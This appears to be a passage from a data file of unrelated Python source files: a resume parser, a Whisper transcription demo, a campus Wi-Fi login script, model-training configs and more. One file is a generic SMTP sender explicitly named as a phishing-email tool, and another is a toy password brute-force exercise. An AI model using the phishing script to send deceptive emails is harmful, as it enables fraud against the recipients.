\r\n                                fake_file_handle, \r\n                                codec='utf-8', \r\n                                laparams=LAParams()\r\n                        )\r\n\r\n            # creating a page interpreter\r\n            page_interpreter = PDFPageInterpreter(\r\n                                resource_manager, \r\n                                converter\r\n                            )\r\n\r\n            # process current page\r\n            page_interpreter.process_page(page)\r\n\r\n            # extract text\r\n            text = fake_file_handle.getvalue()\r\n\r\n            # Remove special characters\r\n            text = re.sub(r'[^a-zA-Z0-9\\s]', '', text)\r\n            text = text.replace('\ueae8','')\r\n            \r\n            # extract text\r\n            text = fake_file_handle.getvalue()\r\n            text = re.sub(r'\\n+', '\\n', text)  # Remove consecutive line breaks\r\n            text = re.sub(r'\\n\\s+', ' ', text)  # Remove leading spaces after line breaks\r\n\r\n            # Remove Unicode characters\r\n            text = remove_unicode(text)\r\n\r\n            yield text\r\n\r\n            # close open handles\r\n            converter.close()\r\n            fake_file_handle.close()\r\n\r\n# calling above function and extracting text\r\ncleaned_text = ''\r\nfor page in extract_text_from_pdf(file_path):\r\n    cleaned_text += ' ' + page\r\n\r\n#print(cleaned_text)\r\n\r\n#extracting the 1st 5% of the text\r\ndef extract_first_percentage(text, percentage):\r\n    total_characters = len(text)\r\n    percentage_characters = int(total_characters * (percentage / 100))\r\n    return text[:percentage_characters]\r\n\r\n# Example usage:\r\nfirst_5_percent = extract_first_percentage(cleaned_text, 5)\r\n#print(first_5_percent)\r\n\r\ndef on_match(matcher, doc, id, matches):\r\n    unique_matches = set(matches)\r\n    for id, start, end in unique_matches:\r\n        match_text = doc[start:end].text\r\n        print(\"Name:\", match_text)\r\n\r\nnlp = spacy.load('en_core_web_sm')    \r\nmatcher = Matcher(nlp.vocab)\r\npatterns = [\r\n    [{'POS': 'PROPN'}, {'POS': 'PROPN'}]\r\n]\r\nmatcher.add(\"PERSON_NAME\", patterns, on_match=on_match)\r\ndoc = nlp(first_5_percent)\r\nmatches = matcher(doc)\r\n\r\n#email\r\ndef extract_email(email):\r\n    email = re.findall(\"([^@|\\s]+@[^@]+\\.[^@|\\s]+)\", email)\r\n    if email:\r\n        try:\r\n            return email[0].split()[0].strip(';')\r\n        except IndexError:\r\n            return None\r\nemail = extract_email(cleaned_text)\r\nprint(\"Email:\", email)\r\n\r\ndef extract_mobile_number(text):\r\n    phone = re.findall((r'[\\+\\(]?[1-9][0-9 .\\-\\(\\)]{8,}[0-9]'),text)\r\n    for number in phone:\r\n        print(\"Mobile number:\", number)\r\nmobile_number = extract_mobile_number(cleaned_text)\r\n\r\ndef extract_locations(text):\r\n    nlp = spacy.load('en_core_web_sm')\r\n    doc = nlp(text)\r\n    locations = []\r\n\r\n    for entity in doc.ents:\r\n        if entity.label_ == 'GPE':\r\n            print(\"Location:\", entity.text)\r\n            break\r\nlocations = extract_locations(cleaned_text)\r\n\r\nnlp = spacy.load('en_core_web_sm')\r\n\r\n\r\ndef extract_skills(text):\r\n    nlp_text = nlp(text)\r\n\r\n    tokens = [token.text for token in nlp_text if not token.is_stop and token.is_alpha and token.sent]\r\n    #import your own data csv file\r\n    data = pd.read_csv(\"sk.csv\")\r\n    skills = set(data['Skill'].str.lower().tolist())\r\n\r\n    skillset = [token.capitalize() for token in tokens if token.lower() in skills]\r\n\r\n    return list(set(skillset))  \r\n\r\n\r\nskills = extract_skills(cleaned_text)\r\nprint(\"Skills:\", skills)\r\n\r\ndef match_skills_with_job_domain(skills):\r\n    #import your own data csv file\r\n    data = pd.read_csv('job2.csv')\r\n\r\n    skill_domain_mapping = {}\r\n    job_domain_count = {}\r\n\r\n    for index, row in data.iterrows():\r\n        skill = row['Skill']\r\n        job_domain = row['Job Domain']\r\n        skill_domain_mapping[skill.lower()] = job_domain\r\n\r\n        if job_domain ",
    "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\ndef send_phishing_email(sender_email, sender_password, recipient_email, subject, message):\n    try:\n        smtp_server = smtplib.SMTP('smtp.gmail.com', 587)\n        smtp_server.starttls()\n        smtp_server.login(sender_email, sender_password)\n\n        email_message = MIMEMultipart()\n        email_message['From'] = sender_email\n        email_message['To'] = recipient_email\n        email_message['Subject'] = subject\n        email_message.attach(MIMEText(message, 'plain'))\n\n        smtp_server.send_message(email_message)\n        print(\"Phishing email sent successfully\")\n    except Exception as e:\n        print(\"An error occurred:\", e)\n    finally:\n        smtp_server.quit()\n\nif __name__ == \"__main__\":\n    sender_email = input(\"Enter your email address: \")\n    sender_password = input(\"Enter your email password: \")\n    recipient_email = input(\"Enter recipient's email address: \")\n    subject = input(\"Enter email subject: \")\n    message = input(\"Enter email message: \")\n\n    send_phishing_email(sender_email, sender_password, recipient_email, subject, message)\n",
    "# Determinar cu\u00e1ntos intentos son necesarios para encontrar combinaciones num\u00e9ricas en\n# min\u00fascula. El programa fuerza_bruta debe intentar todas las combinaciones de letras\n# posibles, en orden alfab\u00e9tico, hasta que la combinaci\u00f3n de letras sea igual a la de la\n# contrase\u00f1a indicada. Deber\u00e1 hacer este proceso letra por letra, de izquierda a derecha.\n\nfrom string import ascii_lowercase\nfrom pyfiglet import Figlet\nimport pyfiglet\n\ndef show_title():\n    f = Figlet(font='slant')\n    print(f.renderText('Fuerza Bruta !'))\n\ndef fuerza_bruta(password):\n    intentos = 0\n    for letra in password:\n        encontrado = False\n        for guess in ascii_lowercase:\n            intentos += 1\n            if guess == letra:\n                encontrado = True\n                print(guess,intentos)\n                break\n        if not encontrado:\n            return -1  # Si una letra de la contrase\u00f1a no se encuentra en ascii_lowercase, se devuelve -1\n    return intentos\n\ndef main():\n    show_title()\n    password = input(\"Ingrese la contrase\u00f1a: \").lower()  # Convertimos la contrase\u00f1a a min\u00fasculas\n    intentos = fuerza_bruta(password)\n    if intentos == -1:\n        print(\"Error: La contrase\u00f1a contiene caracteres no v\u00e1lidos.\")\n    else:\n        print(\"La contrase\u00f1a fue forzada en\", intentos, \"intentos.\")\n\nif __name__ == \"__main__\":\n    main()",
    "from urllib.request import urlopen\n\nimport reflex as rx\n\nfrom reflex_audio_capture import AudioRecorderPolyfill, get_codec, strip_codec_part\n\nfrom openai import AsyncOpenAI\n\nclient = AsyncOpenAI()\n\nREF = \"myaudio\"\n\n\nclass State(rx.State):\n    \"\"\"The app state.\"\"\"\n\n    has_error: bool = False\n    processing: bool = False\n    transcript: list[str] = []\n    timeslice: int = 0\n    device_id: str = \"\"\n    use_mp3: bool = True\n\n    async def on_data_available(self, chunk: str):\n        mime_type, _, codec = get_codec(chunk).partition(\";\")\n        audio_type = mime_type.partition(\"/\")[2]\n        if audio_type == \"mpeg\":\n            audio_type = \"mp3\"\n        print(len(chunk), mime_type, codec, audio_type)\n        with urlopen(strip_codec_part(chunk)) as audio_data:\n            try:\n                self.processing = True\n                yield\n                transcription = await client.audio.transcriptions.create(\n                    model=\"whisper-1\",\n                    file=(\"temp.\" + audio_type, audio_data.read(), mime_type),\n                )\n            except Exception as e:\n                self.has_error = True\n                yield capture.stop()\n                raise\n            finally:\n                self.processing = False\n            self.transcript.append(transcription.text)\n\n    def set_timeslice(self, value):\n        self.timeslice = value[0]\n\n    def set_device_id(self, value):\n        self.device_id = value\n        yield capture.stop()\n\n    def on_error(self, err):\n        print(err)\n\n    def on_load(self):\n        # We can start the recording immediately when the page loads\n        return capture.start()\n\n\ncapture = AudioRecorderPolyfill.create(\n    id=REF,\n    on_data_available=State.on_data_available,\n    on_error=State.on_error,\n    timeslice=State.timeslice,\n    device_id=State.device_id,\n    use_mp3=State.use_mp3,\n)\n\n\ndef input_device_select():\n    return rx.select.root(\n        rx.select.trigger(placeholder=\"Select Input Device\"),\n        rx.select.content(\n            rx.foreach(\n                capture.media_devices,\n                lambda device: rx.cond(\n                    device.deviceId & device.kind == \"audioinput\",\n                    rx.select.item(device.label, value=device.deviceId),\n                ),\n            ),\n        ),\n        on_change=State.set_device_id,\n    )\n\n\ndef index() -> rx.Component:\n    return rx.container(\n        rx.vstack(\n            rx.heading(\"OpenAI Whisper Demo\"),\n            rx.card(\n                rx.vstack(\n                    f\"Timeslice: {State.timeslice} ms\",\n                    rx.slider(\n                        min=0,\n                        max=10000,\n                        value=[State.timeslice],\n                        on_change=State.set_timeslice,\n                    ),\n                    rx.cond(\n                        capture.media_devices,\n                        input_device_select(),\n                    ),\n                ),\n            ),\n            capture,\n            rx.text(f\"Recorder Status: {capture.recorder_state}\"),\n            rx.cond(\n                capture.is_recording,\n                rx.button(\"Stop Recording\", on_click=capture.stop()),\n                rx.button(\n                    \"Start Recording\",\n                    on_click=capture.start(),\n                ),\n            ),\n            rx.card(\n                rx.text(\"Transcript\"),\n                rx.divider(),\n                rx.foreach(\n                    State.transcript,\n                    rx.text,\n                ),\n                rx.cond(\n                    State.processing,\n                    rx.text(\"...\"),\n                ),\n            ),\n            style={\"width\": \"100%\", \"> *\": {\"width\": \"100%\"}},\n        ),\n        size=\"1\",\n        margin_y=\"2em\",\n    )\n\n\n# Add state and page to the app.\napp = rx.App()\napp.add_page(index)\n",
    "# Import necessary libraries\nfrom sentence_transformers import SentenceTransformer\nfrom sklearn.metrics.pairwise import cosine_similarity\nfrom neural_searcher import NeuralSearcher  # Import your NeuralSearcher class\nimport redis  # Import the Redis library for connection\nimport json  # Import JSON library for handling JSON data\n\n# Connect to Redis server\nr = redis.Redis(\n    host='127.0.0.1',\n    port=6379,\n    decode_responses=True\n)\nprint(\"connected to redis\")\n\n# Create a pub/sub object to listen for incoming messages from a Redis channel\nmobile = r.pubsub()\nmobile.subscribe('newProductsSourceForge')\n\n# Load pre-trained SentenceTransformer model for text encoding\nmodel = SentenceTransformer(\"all-MiniLM-L6-v2\", device=\"cuda\")\nprint(\"Model loaded successfully\")\n\n# Initialize NeuralSearcher for product search\nneural_searcher = NeuralSearcher(\"G2products\")\nprint(\"Neural Searcher loaded successfully\")\n\n# Function to calculate cosine similarity between two strings\ndef cosine_similarity_between_strings(string1, string2): \n    vector1 = model.encode(string1)  # Encode first string\n    vector2 = model.encode(string2)  # Encode second string\n\n    # Reshape the vectors for cosine similarity calculation\n    vector1 = vector1.reshape(1, -1)\n    vector2 = vector2.reshape(1, -1)\n\n    # Calculate cosine similarity between the two vectors\n    similarity_score = cosine_similarity(vector1, vector2)[0][0]\n\n    return similarity_score\n\n# Function to get similar products based on a product name\ndef get_similar_products(product_name, filter=None):\n    similar_products = neural_searcher.search(product_name, filter)\n    return similar_products\n\n# Function to calculate similarity score between two products\ndef get_similarity_score(product1, product2):\n    if(product1[\"name\"] == product2[\"name\"]):\n        return 1.0\n    if(product1[\"description\"] == None):\n        return 0.0\n\n    similarity_score_names = cosine_similarity_between_strings(product1[\"name\"], product2[\"name\"])\n    similarity_score_descriptions = cosine_similarity_between_strings(product1[\"description\"], product2[\"description\"])\n## We have performed a weighted average of the similarity scores for the product names and descriptions.(60% for names and 40% for descriptions)\n    similarity_score =  0.6 * similarity_score_names + 0.4 * similarity_score_descriptions\n\n    return similarity_score\n\n# Function to process incoming product\ndef process_product(product):\n    similar_products = get_similar_products(product[\"name\"])\n    similarity_score = get_similarity_score(product, similar_products[0])\n    if similarity_score > 0.85:\n        print(\"Product already exists\")\n    else:\n        print(\"Product not found\")\n        Products_Not_Exist.append(product)\n\n# Function to save products not found to a JSON file\ndef save_products_not_found():\n    try:\n        with open(\"products_not_found.json\", \"r\") as f:\n            existing_data = json.load(f)\n    except FileNotFoundError:\n        existing_data = []\n\n    for product in Products_Not_Exist:\n        if product not in existing_data:\n            existing_data.append(product)\n\n    with open(\"products_not_found.json\", \"w\") as f:\n        json.dump(existing_data, f)\n\ncount = 0\nProducts_Not_Exist = []\n\n# Listen for incoming messages from the Redis pub/sub channel\nfor message in mobile.listen():\n    count += 1\n    if message['type'] == 'message':\n        try:\n            print(f\"Received message: {message['data']}\")\n            data = json.loads(message['data'])\n            print(f\"Decoded message: {data.get('description')}\")\n            process_product(data)\n            print(\"number processed:\")\n            print(count)\n        except Exception as e:\n            print(f\"Error processing message: {str(e)}\")\n            continue\n        # Save products not found every 10 messages just to reduce IO\n        if count % 10 == 0:\n            save_products_not_found()\n",
    "# socket \u5e93 \u8fd9\u91cc\u7684\u4f5c\u7528\u662f\u52a8\u6001\u7684\u83b7\u53d6\u672c\u673aip\nimport socket\n# \u5f15\u5165 requests \u8bf7\u6c42\u5e93\nimport requests\nimport time\n\nimport wifi\n# \u5bfb\u627e zzuli-student \u7f51\u7edc\uff0c\u5e76\u8fde\u63a5\uff08\u76f8\u5f53\u4e8e\u6211\u4eec\u70b9\u51fb\u8fde\u63a5\uff0c\u63a5\u4e0b\u6765\u4f1a\u8df3\u8f6c\u8ba4\u8bc1\u8fd9\u4e00\u6b65\uff09\nwifi.wifi_connect()\ntime.sleep(1) # win \u7528\u6237\u5982\u679c\u81ea\u52a8\u5f39\u51fa\u4e86\u6821\u56ed\u7f51\u8ba4\u8bc1\u7a97\u53e3\uff0c\u628a\u8fd9\u4e2a\u503c\u8c03\u5927\u4e9b\uff0c\u8fd9\u91cc\u662f1\u79d2\uff0c\u53ef\u4ee5\u6539\u62102\u62163\u79d2\u8bd5\u8bd5\uff0c\u8fd9\u4e2a\u65f6\u5019\u4e5f\u4f1a\u5f39\u7a97\uff0c\u4f46\u662f\u540e\u9762\u4ee3\u7801\u6267\u884c\u540e\uff0c\u6821\u56ed\u7f51\u5c31\u5df2\u7ecf\u53ef\u4ee5\u7528\u4e86\uff0c\u5173\u95ed\u6807\u7b7e\u5373\u53ef\uff08\u5feb\u6377\u952e\u6216\u624b\u52a8\u5173\u95ed\uff09\u3002\n\n# \u83b7\u53d6\u672c\u673a\u5728\u5c40\u57df\u7f51\u4e2d\u7684\u52a8\u6001IP\ndef get_ip():\n  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n  s.connect(('8.8.8.8', 80))\n  ip = s.getsockname()[0]\n  s.close()\n  return ip\nip = get_ip()\n\n# \u6821\u56ed\u7f51\u767b\u5f55\u9875\u7684 url  \u548cf12 network \u4e2d\u7684 http\u8bf7\u6c42 url \u4e00\u81f4\uff0c\u628aURL\u4e2d\u7684\u672c\u673aIP\u53c2\u6570\u66ff\u6362\u4e00\u4e0b\npost_url = 'http://10.168.6.10:801/eportal/?c=ACSetting&a=Login&protocol=http:&hostname=10.168.6.10&iTermType=1&wlanuserip={0}&wlanacip=10.168.6.9&mac=00-00-00-00-00-00&ip={0}&enAdvert=0&queryACIP=0&loginMethod=1'.format(ip)\n\n\n# http post\u8bf7\u6c42\u7684 \u53c2\u6570\npost_data = {\n  \"DDDDD\": ',0,54xxxxxxxx@unicom', # \u6821\u56ed\u7f51\u8d26\u53f7\uff0c\u524d\u9762\u7684 0 \u8868\u793a\u8bbe\u5907\u7c7b\u578b\uff080\u4ee3\u8868\u684c\u9762\u7aef\uff09\uff0c 54xxxxxxx\u662f\u4f60\u7684\u5b66\u53f7 @ \u540e\u9762\u7684\u662f\u8fd0\u8425\u5546\uff0cDDDDD\u8fd9\u4e2a\u53c2\u6570\u53ef\u4ee5\u5728http\u8bf7\u6c42\u62a5\u6587\u4e2d\u7684 payload \u4e2d\u627e\u5230\uff0c\u66ff\u6362\u6210\u81ea\u5df1\u7684\u5373\u53ef\n  \"upass\": 'xxxxxx', # \u6821\u56ed\u7f51\u7684\u767b\u5f55\u5bc6\u7801\n  \"R1\": \"0\",\n  \"R2\": \"0\",\n  \"R3\": \"0\",\n  \"R6\": \"0\",\n  \"para\": \"00\",\n  \"OMKKey\": \"123456\",\n}\n\n# \u6ce8\u610f header \u5b57\u6bb5\u4e2d\u7684\u6570\u636e\uff0c\u4e5f\u66ff\u6362\u6210\u81ea\u5df1\u7684 http post \u8bf7\u6c42\u7684 header \u5b57\u6bb5\uff0c\u5176\u4e2d win \u7528\u6237\u7684 User-Agent \u5b57\u6bb5\u5fc5\u987b\u66ff\u6362\u6210\u81ea\u5df1\u7684\nheader = {\n  \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\",\n  \"Accept-Encoding\": \"gzip, deflate\",\n  \"Accept-Language\": \"zh-CN,zh;q=0.9\",\n  \"Cache-Control\": \"max-age=0\",\n  \"Connection\": \"keep-alive\",\n  \"Content-Type\": \"application/x-www-form-urlencoded\",\n  \"Host\": \"10.168.6.10:801\",\n  \"Upgrade-Insecure-Requests\": \"1\",\n  \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"\n}\n\n# \u5f00\u59cb\u7f51\u7edc\u8ba4\u8bc1\uff08\u76f8\u5f53\u4e8e\u6211\u4eec\u8f93\u5165\u6821\u56ed\u7f51\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u70b9\u51fb\u8ba4\u8bc1\u8fd9\u4e00\u6b65\uff09\nresponse = requests.post(post_url, data=post_data, headers=header)\n# response = requests(\"POST\", url, data, header=header)\n# POST \u65b9\u5f0f\u5411 URL \u53d1\u9001\u8868\u5355\uff0c\u540c\u65f6\u83b7\u53d6\u72b6\u6001\u7801\nprint(\"\u72b6\u6001\u7801{}\".format(response))  # \u6253\u5370\u72b6\u6001\u7801\n\nprint(post_url)",
    "from potential_correction import util as pul\nfrom autoarray.inversion.linear_obj.linear_obj import LinearObj\nfrom autoarray.inversion.regularization.abstract import AbstractRegularization\nimport numpy as np\nfrom abc import abstractmethod\n\n\nclass CovarianceRegularization(AbstractRegularization):\n    def __init__(self, coefficient: float = 1.0, scale: float = 1.0):\n        self.coefficient = coefficient\n        self.scale = scale\n\n\n    def regularization_parameters_from(self, linear_obj: LinearObj) -> np.ndarray:\n        return self.coefficient * np.ones(linear_obj.params), self.scale * np.ones(linear_obj.params)\n    \n\n    @abstractmethod\n    def regularization_matrix_from(self, points) -> np.ndarray:\n        \"\"\"\n        points: the position of mesh that is regularized\n        \"\"\"\n        pass\n\n\n\nclass GaussianRegularization(CovarianceRegularization):\n    def regularization_matrix_from(self, points) -> np.ndarray:\n        \"\"\"\n        points: the position of mesh that is regularized\n        \"\"\"\n        return pul.regularization_matrix_gp_from(\n            coefficient=self.coefficient,\n            scale=self.scale,\n            nu=None,\n            points=points,\n            reg_type='gauss'\n        )\n    \n\n\nclass ExponentialRegularization(CovarianceRegularization):\n    def regularization_matrix_from(self, points) -> np.ndarray:\n        \"\"\"\n        points: the position of mesh that is regularized\n        \"\"\"\n        return pul.regularization_matrix_gp_from(\n            coefficient=self.coefficient,\n            scale=self.scale,\n            nu=None,\n            points=points,\n            reg_type='exp'\n        )\n    \n\n\nclass MaternRegularization(CovarianceRegularization):\n    def __init__(self, coefficient: float = 1.0, scale: float = 1.0, nu: float = 0.5):\n        self.coefficient = coefficient\n        self.scale = float(scale)\n        self.nu = float(nu)\n\n\n    def regularization_parameters_from(self, linear_obj: LinearObj) -> np.ndarray:\n        return self.coefficient * np.ones(linear_obj.params), self.scale * np.ones(linear_obj.params), self.nu * np.ones(linear_obj.params)\n\n\n    def regularization_matrix_from(self, points) -> np.ndarray:\n        \"\"\"\n        points: the position of mesh that is regularized\n        \"\"\"\n        return pul.regularization_matrix_gp_from(\n            coefficient=self.coefficient,\n            scale=self.scale,\n            nu=self.nu,\n            points=points,\n            reg_type='matern',\n        )\n    \n\n\nclass CurvatureRegularizationDpsi(AbstractRegularization):\n    def __init__(self, coefficient: float = 1.0):\n        self.coefficient = coefficient\n\n\n    def regularization_parameters_from(self, linear_obj: LinearObj) -> np.ndarray:\n        return self.coefficient * np.ones(linear_obj.params)\n    \n\n    @abstractmethod\n    def regularization_matrix_from(self, mask) -> np.ndarray:\n        \"\"\"\n        mask: the mask that defines the pixels that are modeled\n        \"\"\"\n        return self.coefficient * pul.dpsi_curvature_reg_matrix_from(mask)\n    \n\n\nclass FourthOrderRegularizationDpsi(AbstractRegularization):\n    def __init__(self, coefficient: float = 1.0):\n        self.coefficient = coefficient\n\n\n    def regularization_parameters_from(self, linear_obj: LinearObj) -> np.ndarray:\n        return self.coefficient * np.ones(linear_obj.params)\n    \n\n    @abstractmethod\n    def regularization_matrix_from(self, mask) -> np.ndarray:\n        \"\"\"\n        mask: the mask that defines the pixels that are modeled\n        \"\"\"\n        return self.coefficient * pul.dpsi_4th_reg_matrix_from(mask)",
    "import os\r\nimport sys\r\nimport time\r\nimport requests\r\nfrom flask import Flask,send_from_directory\r\nfrom multiprocess import Process\r\ndef print_js_files(folder_path):\r\n    jsfile = []\r\n    for root, dirs, files in os.walk(folder_path):\r\n\r\n        # \u6253\u5370.js\u6587\u4ef6\r\n        for file in files:\r\n            if file.endswith(\".js\"):\r\n                file_path = os.path.join(root, file)\r\n                relative_file_path = os.path.relpath(file_path, folder_path).replace('\\\\', '/')\r\n                jsfile.append(relative_file_path)\r\n\r\n    return jsfile\r\n\r\ndef client_request(path):\r\n    time.sleep(1)\r\n    current_folder = path\r\n\r\n    proxy = {\"http\": \"http://127.0.0.1:8080\"}\r\n    host = 'http://127.0.0.1:8000'\r\n\r\n    jss = print_js_files(current_folder)\r\n    for js in jss:\r\n        url = host + '/' + js\r\n        print(url)\r\n        resp = requests.get(url=url, proxies=proxy)\r\n\r\ndef start_server(path):\r\n    app = Flask(__name__, root_path=path)\r\n    print(\"\u5e94\u7528\u7684\u5de5\u4f5c\u76ee\u5f55\uff1a\", app.root_path)\r\n\r\n    @app.route('/<path:subpath>')\r\n    def serve_js(subpath):\r\n        js_directory = os.path.join(app.root_path, os.path.dirname(subpath))\r\n        return send_from_directory(js_directory, os.path.basename(subpath))\r\n    app.run(debug=True, host=\"127.0.0.1\",port=8000,use_reloader=False)\r\n\r\nif __name__ == \"__main__\":\r\n    if len(sys.argv) < 2:\r\n        print(\"Usage:python JsInfoExtract.py \\\"js\u6587\u4ef6\u6839\u76ee\u5f55\\\"\")\r\n        sys.exit()\r\n    path = sys.argv[1]\r\n    client = Process(target=client_request, args=(path,))\r\n    # start_server(path)\r\n    server = Process(target=start_server, args=(path,))\r\n    server.start()\r\n    print(\"Server start......\")\r\n    client.start()\r\n\r\n\r\n",
    "# Copyright (c) OpenMMLab. All rights reserved.\nimport torch\nfrom bitsandbytes.optim import PagedAdamW32bit\nfrom datasets import load_dataset\nfrom mmengine.dataset import DefaultSampler\nfrom mmengine.hooks import (CheckpointHook, DistSamplerSeedHook, IterTimerHook,\n                            LoggerHook, ParamSchedulerHook)\nfrom mmengine.optim import AmpOptimWrapper, CosineAnnealingLR\nfrom peft import LoraConfig\nfrom transformers import (AutoModelForCausalLM, AutoTokenizer,\n                          BitsAndBytesConfig)\n\nfrom xtuner.dataset import process_hf_dataset\nfrom xtuner.dataset.collate_fns import default_collate_fn\nfrom xtuner.dataset.map_fns import alpaca_zh_map_fn, template_map_fn_factory\nfrom xtuner.engine import DatasetInfoHook, EvaluateChatHook\nfrom xtuner.model import SupervisedFinetune\nfrom xtuner.utils import PROMPT_TEMPLATE, SYSTEM_TEMPLATE\n\n#######################################################################\n#                          PART 1  Settings                           #\n#######################################################################\n# Model\npretrained_model_name_or_path = 'THUDM/chatglm2-6b'\n\n# Data\nalpaca_zh_path = 'silk-road/alpaca-data-gpt4-chinese'\nprompt_template = PROMPT_TEMPLATE.chatglm2\nmax_length = 2048\npack_to_max_length = True\n\n# Scheduler & Optimizer\nbatch_size = 1  # per_device\naccumulative_counts = 16\ndataloader_num_workers = 0\nmax_epochs = 3\noptim_type = PagedAdamW32bit\nlr = 2e-4\nbetas = (0.9, 0.999)\nweight_decay = 0\nmax_norm = 1  # grad clip\n\n# Evaluate the generation performance during the training\nevaluation_freq = 500\nSYSTEM = SYSTEM_TEMPLATE.alpaca\nevaluation_inputs = [\n    '\u8bf7\u7ed9\u6211\u4ecb\u7ecd\u4e94\u4e2a\u4e0a\u6d77\u7684\u666f\u70b9', 'Please tell me five scenic spots in Shanghai'\n]\n\n#######################################################################\n#                      PART 2  Model & Tokenizer                      #\n#######################################################################\ntokenizer = dict(\n    type=AutoTokenizer.from_pretrained,\n    pretrained_model_name_or_path=pretrained_model_name_or_path,\n    trust_remote_code=True,\n    padding_side='left')\n\nmodel = dict(\n    type=SupervisedFinetune,\n    llm=dict(\n        type=AutoModelForCausalLM.from_pretrained,\n        pretrained_model_name_or_path=pretrained_model_name_or_path,\n        trust_remote_code=True,\n        torch_dtype=torch.float16,\n        quantization_config=dict(\n            type=BitsAndBytesConfig,\n            load_in_4bit=True,\n            load_in_8bit=False,\n            llm_int8_threshold=6.0,\n            llm_int8_has_fp16_weight=False,\n            bnb_4bit_compute_dtype=torch.float16,\n            bnb_4bit_use_double_quant=True,\n            bnb_4bit_quant_type='nf4')),\n    lora=dict(\n        type=LoraConfig,\n        r=64,\n        lora_alpha=16,\n        lora_dropout=0.1,\n        bias='none',\n        task_type='CAUSAL_LM'))\n\n#######################################################################\n#                      PART 3  Dataset & Dataloader                   #\n#######################################################################\nalpaca_zh = dict(\n    type=process_hf_dataset,\n    dataset=dict(type=load_dataset, path=alpaca_zh_path),\n    tokenizer=tokenizer,\n    max_length=max_length,\n    dataset_map_fn=alpaca_zh_map_fn,\n    template_map_fn=dict(\n        type=template_map_fn_factory, template=prompt_template),\n    remove_unused_columns=True,\n    shuffle_before_pack=True,\n    pack_to_max_length=pack_to_max_length)\n\ntrain_dataloader = dict(\n    batch_size=batch_size,\n    num_workers=dataloader_num_workers,\n    dataset=alpaca_zh,\n    sampler=dict(type=DefaultSampler, shuffle=True),\n    collate_fn=dict(type=default_collate_fn))\n\n#######################################################################\n#                    PART 4  Scheduler & Optimizer                    #\n#######################################################################\n# optimizer\noptim_wrapper = dict(\n    type=AmpOptimWrapper,\n    optimizer=dict(\n        type=optim_type, lr=lr, betas=betas, weight_decay=weight_decay),\n    clip_grad=dict(max_norm=max_norm, error_if_nonfinite=False),\n    accumulative_counts=accumulative_counts,\n    loss_scale='dynamic',\n    dtype='float16')\n\n# learning policy\n# More information: https://github.com/open-mmlab/mmengine/blob/main/docs/en/tutorials/param_scheduler.md  # noqa: E501\nparam_scheduler = dict(\n    type=CosineAnnealingLR,\n    eta_min=0.0,\n    by_epoch=True,\n    T_max=max_epochs,\n    convert_to_iter_based=True)\n\n# train, val, test setting\ntrain_cfg = dict(by_epoch=True, max_epochs=max_epochs, val_interval=1)\n\n#######################################################################\n#                           PART 5  Runtime                           #\n#######################################################################\n# Log the dialogue periodically during the training process, optional\ncustom_hooks = [\n    dict(type=DatasetInfoHook, tokenizer=tokenizer),\n    dict(\n        type=EvaluateChatHook,\n       ",
    "# -*- coding: utf-8 -*-\nimport logging\n\nfrom odoo import models, fields, api, _\nfrom odoo.exceptions import UserError, ValidationError\n\n_logger = logging.getLogger(__name__)\n\n\nclass HotelChain(models.Model):\n    _inherit = \"res.partner\"\n    _rec_name = \"hotel_chain_name\"\n\n    hotel_chain_name = fields.Char(string=\"Hotel Chain Name\")\n    country_of_origin = fields.Char(string=\"Country of Origin\")\n    headquarters_address = fields.Char(string=\"Headquarters Address\")\n    total_hotels = fields.Integer(string=\"Total Number of Hotels\")\n    chain_category = fields.Selection(\n        [\n            (\"luxury\", \"Luxury\"),\n            (\"economy\", \"Economy\"),\n            (\"boutique\", \"Boutique\"),\n            (\"other\", \"Other\"),\n        ],\n        string=\"Chain Category\",\n    )\n    corporate_website = fields.Char(string=\"Corporate Website\")\n    corporate_contact_info = fields.Text(string=\"Corporate Contact Information\")\n    foundation_date = fields.Date(string=\"Foundation Date\")\n    financial_information = fields.Text(string=\"Financial Information\")\n    hotel_affiliation_status = fields.Selection(\n        [(\"active\", \"Active\"), (\"inactive\", \"Inactive\")],\n        string=\"Hotel Affiliation Status\",\n    )\n",
    "import gpustat\nfrom IPython import get_ipython\nfrom IPython.display import clear_output, display\n\nfrom .widgets import GPUStatsApp\n\n\ndef is_notebook():\n    try:\n        shell = get_ipython().__class__.__name__\n        print(\"###\", shell)\n        if shell == \"ZMQInteractiveShell\":  # jupyter notebook\n            return True\n        elif shell == \"TerminalInteractiveShell\":  # iPython\n            return False\n        elif shell == \"Shell\":  # Google Colab\n            return True\n        else:\n            return False\n    except NameError:\n        return False\n\n\ndef live(stop_immediately=False):\n    try:\n        if not is_notebook():\n            print(\n                \"gpuwidget.live() only works in a Jupyter Notebook, return ascii version instead.\"\n            )\n            print(gpustat.new_query().print_formatted())\n            return\n        clear_output(wait=True)\n        widget = GPUStatsApp()\n        if stop_immediately:\n            widget.stop_updating(widget.stop_button)\n        display(widget)\n    except Exception as e:\n        print(e)\n        print(\"It's likely your runtime does not contains GPU instance.\")\n\n\ndef once():\n    live(stop_immediately=True)\n",
    "\"\"\"Schemas\n\nRevision ID: 27f4f3d7c261\nRevises: \nCreate Date: 2024-04-15 04:20:39.449435\n\n\"\"\"\nfrom typing import Sequence, Union\n\nfrom alembic import op\nimport sqlalchemy as sa\nimport sqlmodel\n\n# revision identifiers, used by Alembic.\nrevision: str = '27f4f3d7c261'\ndown_revision: Union[str, None] = None\nbranch_labels: Union[str, Sequence[str], None] = None\ndepends_on: Union[str, Sequence[str], None] = None\n\n\ndef upgrade() -> None:\n    # ### commands auto generated by Alembic - please adjust! ###\n    op.create_table('shopify_pages',\n    sa.Column('id', sa.Integer(), nullable=False),\n    sa.Column('page_id', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('shopify_store_id', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('title', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('handle', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('body_html', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('author', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    